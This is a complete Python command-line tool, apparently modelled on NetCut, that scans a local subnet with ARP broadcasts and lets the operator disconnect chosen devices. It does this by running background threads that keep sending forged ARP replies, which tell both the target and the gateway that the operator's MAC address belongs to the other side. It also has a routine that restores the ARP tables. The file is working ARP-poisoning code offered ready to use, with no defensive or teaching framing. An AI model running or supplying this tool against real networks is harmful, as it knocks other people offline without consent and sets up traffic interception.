#!/usr/bin/env python3
import os
import sys
import time
import signal
import threading
import netifaces
import socket
import urllib.request
import urllib.error
from scapy.all import *
from scapy.layers.l2 import Ether, ARP

# --- ANSI Color Codes for a better CLI ---
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- Device Data Structure ---
class Device:
    def __init__(self, ip, mac, hostname=None, vendor=None):
        self.ip = ip
        self.mac = mac
        self.hostname = hostname or "Unknown"
        self.vendor = vendor or "Unknown"
        self.state = "Connected"
        self.thread = None
        self.stop_event = None

    def __repr__(self):
        # Green for any connected/router state, Red only for Disconnected
        status_color = Colors.RED if "Disconnected" in self.state else Colors.GREEN
        name_str = f" ({self.hostname})" if self.hostname != "Unknown" else ""
        vendor_str = f" [{self.vendor}]" if self.vendor != "Unknown" else ""
        return (f" {Colors.CYAN}{self.ip}{Colors.RESET}{name_str}{vendor_str} -> "
                f"{Colors.MAGENTA}{self.mac}{Colors.RESET} | "
                f"Status: [{status_color}{self.state}{Colors.RESET}]")

# --- Global Controller ---
class NetCutController:
    def __init__(self):
        self.interface = None
        self.ip = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.devices = []
        self.running = True
        signal.signal(signal.SIGINT, self.graceful_shutdown)

    def check_root(self):
        """Step 1: Initialization & Privilege Check"""
        if os.geteuid() != 0:
            print(f"{Colors.RED}Error: This script must be run as root. Use 'sudo'.{Colors.RESET}")
            sys.exit(1)
        print(f"{Colors.GREEN}✓ Root privileges confirmed.{Colors.RESET}")

    def discover_interfaces(self):
        """Step 2: Interface Discovery & Selection"""
        try:
            interfaces = netifaces.interfaces()
            available_interfaces = [i for i in interfaces if i != 'lo' and 'docker' not in i]
           
            if not available_interfaces:
                print(f"{Colors.RED}Error: No usable network interfaces found.{Colors.RESET}")
                sys.exit(1)
            print(f"\n{Colors.BOLD}Step 2: Select Network Interface{Colors.RESET}")
            for i, iface in enumerate(available_interfaces):
                print(f" {i + 1}. {Colors.CYAN}{iface}{Colors.RESET}")
            while True:
                try:
                    choice = int(input(f"\n{Colors.YELLOW}Enter interface number to use: {Colors.RESET}")) - 1
                    if 0 <= choice < len(available_interfaces):
                        self.interface = available_interfaces[choice]
                        break
                    else:
                        print(f"{Colors.RED}Invalid number. Please try again.{Colors.RESET}")
                except ValueError:
                    print(f"{Colors.RED}Invalid input. Please enter a number.{Colors.RESET}")
            # Get IP and Gateway for the chosen interface
            addrs = netifaces.ifaddresses(self.interface)
            if netifaces.AF_INET not in addrs:
                print(f"{Colors.RED}Error: Interface {self.interface} has no IPv4 address.{Colors.RESET}")
                sys.exit(1)
           
            self.ip = addrs[netifaces.AF_INET][0]['addr']
           
            gateways = netifaces.gateways()
            if 'default' not in gateways or netifaces.AF_INET not in gateways['default']:
                print(f"{Colors.RED}Error: Could not find default gateway.{Colors.RESET}")
                sys.exit(1)
           
            self.gateway_ip = gateways['default'][netifaces.AF_INET][0]
            print(f"{Colors.GREEN}✓ Interface selected: {self.interface} ({self.ip}) | Gateway: {self.gateway_ip}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}Error during interface discovery: {e}{Colors.RESET}")
            sys.exit(1)

    def get_device_info(self, ip, mac):
        """Retrieve hostname (reverse DNS) and vendor (MAC OUI lookup)."""
        info = {"hostname": None, "vendor": None}
        
        # 1. Hostname via reverse DNS
        try:
            hostname_data = socket.gethostbyaddr(ip)
            info["hostname"] = hostname_data[0]
        except (socket.herror, socket.gaierror, OSError):
            pass  # Keep None → "Unknown"
        except Exception:
            pass
        
        # 2. Vendor via public API (macvendors.com)
        try:
            req = urllib.request.Request(
                f"https://api.macvendors.com/{mac}",
                headers={'User-Agent': 'Python-urllib/3.0'}
            )
            with urllib.request.urlopen(req, timeout=3) as response:
                info["vendor"] = response.read().decode('utf-8').strip()
        except urllib.error.HTTPError:
            pass  # 404 or other → None
        except Exception:
            pass
        
        return info

    def scan_network(self):
        """Step 3: Network Scanning (The Discovery Phase)"""
        print(f"\n{Colors.BOLD}Step 3: Scanning Network...{Colors.RESET}")
        print(f"{Colors.YELLOW}Scanning for devices on {self.gateway_ip}'s subnet. This may take a moment...{Colors.RESET}")
       
        # Preserve disconnected MACs and STOP old spoof threads (prevents zombie threads)
        disconnected_macs = set()
        if self.devices:
            for d in self.devices:
                if d.state == "Disconnected":
                    disconnected_macs.add(d.mac)
                    if d.stop_event:
                        d.stop_event.set()
                    d.stop_event = None
                    d.thread = None

        # Disable Scapy verbose output
        conf.verb = 0
       
        try:
            # Full subnet scan (includes gateway automatically)
            target_ip_range = self.gateway_ip.rsplit('.', 1)[0] + ".1/24"
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip_range)
            answered, _ = srp(arp_request, timeout=5, retry=2)
           
            # First pass: build temp list and ensure gateway MAC is set
            temp_devices = []
            for sent, received in answered:
                ip = received.psrc
                mac = received.hwsrc
                if ip != self.ip:
                    info = self.get_device_info(ip, mac)
                    device = Device(ip, mac, info["hostname"], info["vendor"])
                    if ip == self.gateway_ip:
                        device.state = "Router (Connected)"
                        self.gateway_ip = ip
                        self.gateway_mac = mac
                    temp_devices.append(device)
           
            # Second pass: rebuild final list + restart spoof threads for previously disconnected devices
            self.devices = []
            for device in temp_devices:
                if device.mac in disconnected_macs:
                    device.state = "Disconnected"
                    stop_event = threading.Event()
                    device.stop_event = stop_event
                    device.thread = threading.Thread(
                        target=self.spoof_thread,
                        args=(device.ip, device.mac, self.gateway_ip, self.gateway_mac, stop_event)
                    )
                    device.thread.daemon = True
                    device.thread.start()
                self.devices.append(device)
           
            # Sort devices by IP
            self.devices.sort(key=lambda x: x.ip)
           
            print(f"{Colors.GREEN}✓ Scan complete. Found {len(self.devices)} device(s).{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}Error during network scan: {e}{Colors.RESET}")
            sys.exit(1)

    def display_devices(self):
        """Step 4: The CLI User Interface"""
        if not self.devices:
            print(f"{Colors.YELLOW}No devices found to display.{Colors.RESET}")
            return
        print(f"\n{Colors.BOLD}--- Discovered Devices ---{Colors.RESET}")
        for i, device in enumerate(self.devices):
            print(f"{Colors.WHITE}[{i + 1}]{Colors.RESET} {device}")
        print(f"\n{Colors.BOLD}{'-' * 25}{Colors.RESET}")
        print(f"{Colors.CYAN}Enter a number to toggle connection, or 'r' to rescan, 'q' to quit.{Colors.RESET}")

    def get_our_mac(self):
        """Gets our own MAC address for the selected interface."""
        return get_if_hwaddr(self.interface)

    def spoof_thread(self, target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
        """The background thread that performs ARP poisoning."""
        our_mac = self.get_our_mac()
       
        # Packet to tell the target we are the gateway
        p1 = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=our_mac)
        # Packet to tell the gateway we are the target
        p2 = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=our_mac)
       
        while not stop_event.is_set():
            sendp(p1, iface=self.interface, verbose=False)
            sendp(p2, iface=self.interface, verbose=False)
            time.sleep(2)

    def restore_target(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Step 6: The "Restore" Mechanism (now sends 5 packets for reliability)"""
        # Packet to restore the target's ARP table
        p1 = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        # Packet to restore the gateway's ARP table
        p2 = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
       
        sendp(p1, count=5, iface=self.interface, verbose=False)
        sendp(p2, count=5, iface=self.interface, verbose=False)
        print(f"{Colors.GREEN}✓ Restored connection for {target_ip}{Colors.RESET}")

    def toggle_device(self, index):
        """Step 5: The "Cut" Mechanism & Step 6: The "Restore" Mechanism"""
        if not (0 <= index < len(self.devices)):
            print(f"{Colors.RED}Error: Invalid device number.{Colors.RESET}")
            return
        device = self.devices[index]
       
        # Don't allow cutting the router
        if device.ip == self.gateway_ip:
            print(f"{Colors.RED}Error: You cannot disconnect the gateway. This would break the network.{Colors.RESET}")
            return
       
        # Toggle the connection state
        if device.state == "Connected":
            print(f"{Colors.YELLOW}Disconnecting {device.ip}...{Colors.RESET}")
            device.state = "Disconnected"
            stop_event = threading.Event()
            device.stop_event = stop_event
            device.thread = threading.Thread(
                target=self.spoof_thread,
                args=(device.ip, device.mac, self.gateway_ip, self.gateway_mac, stop_event)
            )
            device.thread.daemon = True
            device.thread.start()
        elif device.state == "Disconnected":
            print(f"{Colors.GREEN}Restoring connection for {device.ip}...{Colors.RESET}")
            if device.stop_event is not None:
                device.stop_event.set()
                device.stop_event = None
            device.thread = None
            device.state = "Connected"
            self.restore_target(device.ip, device.mac, self.gateway_ip, self.gateway_mac)

    def graceful_shutdown(self, sig, frame):
        """Graceful Shutdown to restore all connections"""
        print(f"{Colors.RED}\nShutting down and restoring all connections...{Colors.RESET}")
        for device in self.devices:
            if device.state == "Disconnected":
                if device.stop_event:
                    device.stop_event.set()
                self.restore_target(device.ip, device.mac, self.gateway_ip, self.gateway_mac)
        sys.exit(0)

def main():
    controller = NetCutController()
    controller.check_root()
    controller.discover_interfaces()
    controller.scan_network()
    while controller.running:
        controller.display_devices()
        action = input(f"{Colors.YELLOW}Enter action: {Colors.RESET}")
       
        if action.lower() == 'q':
            controller.running = False
        elif action.lower() == 'r':
            controller.scan_network()
        elif action.isdigit():
            index = int(action) - 1
            controller.toggle_device(index)
        else:
            print(f"{Colors.RED}Invalid action. Please try again.{Colors.RESET}")

if __name__ == "__main__":
    main()
